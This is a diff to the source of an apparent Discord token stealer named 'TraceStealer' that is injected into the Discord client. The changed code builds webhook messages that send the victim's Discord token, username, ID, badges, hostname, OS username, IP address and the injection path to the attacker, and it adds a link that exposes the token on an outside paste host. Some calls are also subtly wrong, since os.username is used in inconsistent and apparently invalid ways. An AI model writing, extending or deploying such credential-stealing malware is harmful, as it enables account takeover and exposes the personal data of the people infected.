@@ -136,42 +136,50 @@ async function firstTime() {
                 var c = {
                     username: "TraceStealer",
                     content: config.ping[0] ? config.ping[1] : "",
-                    embeds: [{
-                        title: "Discord Initalized",
-                        description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
+                    embeds: [
+                      {
+                        title: "<:a_:1115066752024444980> " + b.username + "#" + b.discriminator + " (" + b.id + ")",
+                        description: "[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + token + ")",
                         color: config["embed-color"],
-                        fields: [{
+                        fields: [
+                          {
                             name: "Info",
-                            value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
-                            inline: !1
-                        }, {
+                            value: "```User: \n" + os.hostname() + "/" + os.username() + "\nInjection Info: \n" + __dirname + "\n```",
+                            inline: false
+                          },
+                          {
                             name: "Username",
-                            value: `\`${b.username}#${b.discriminator}\``,
-                            inline: !0
-                        }, {
+                            value: "`" + b.username + "#" + b.discriminator + "`",
+                            inline: true
+                          },
+                          {
                             name: "ID",
-                            value: `\`${b.id}\``,
-                            inline: !0
-                        }, {
+                            value: "`" + b.id + "`",
+                            inline: true
+                          },
+                          {
                             name: "Badges",
-                            value: `${getBadges(b.flags)}`,
-                            inline: !1
-                        }, {
+                            value: "<:a_:1115067819365761075> " + getBadges(b.flags),
+                            inline: false
+                          },
+                          {
                             name: "Token",
-                            value: `\`\`\`${token}\`\`\``,
-                            inline: !1
-                        }],
+                            value: "<:a_:1115064578183802930> ```" + token + "```",
+                            inline: false
+                          }
+                        ],
                         author: {
-                            name: "TraceStealer"
+                          name: "TraceStealer"
                         },
                         footer: {
-                            text: "TraceStealer"
+                          text: "TraceStealer"
                         },
                         thumbnail: {
-                            url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
+                          url: "https://cdn.discordapp.com/avatars/" + b.id + "/" + b.avatar
                         }
-                    }]
-                };
+                      }
+                    ]
+                  };
                 sendToWebhook(JSON.stringify(c))
             }
 
@@ -194,7 +202,7 @@ async function firstTime() {
                         color: config["embed-color"],
                         fields: [{
                             name: "Info",
-                            value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
+                            value: `User: \n${os.hostname()}.${os.username}\n\`\`\`Injection Location: \n${__dirname}\n\`\`\``,
                             inline: !1
                         }],
                         author: {
@@ -318,7 +326,7 @@ async function userLogin(password, email, token) {
             "color": config['embed-color'],
             "fields": [{
                 name: "Info",
-                value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
+                value: `\`\`\`User: \n${os.hostname()}/${os.username}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
                 inline: !1
             }, {
                 name: "Username",
